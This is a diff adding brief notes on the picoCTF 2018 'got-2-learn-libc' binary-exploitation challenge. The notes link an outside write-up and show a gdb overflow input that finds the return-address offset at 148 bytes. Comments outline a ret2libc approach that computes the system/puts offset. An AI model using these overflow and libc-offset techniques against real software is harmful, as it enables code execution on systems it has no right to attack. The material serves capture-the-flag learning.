@@ -1,0 +1,14 @@
+Super cool solution to this automating it with python: https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/got-2-learn-libc
+
+
+0x00000802 = return from vuln()
+buf is 148 in size
+
+
+(gdb) run <<< $(python -c "print 'A'*148 + 'BBBBCCCCDDDDEEEEFFFFGGGGHHHH'")
+SEGFAULT - x45454545 in ?? ()
+-  (0x45 = E)
+
+# we can lookup locally systems and puts locations in libc, that will give us a delta.
+# when we run on the server, we can apply that offset to what the output says to find where system is.
+
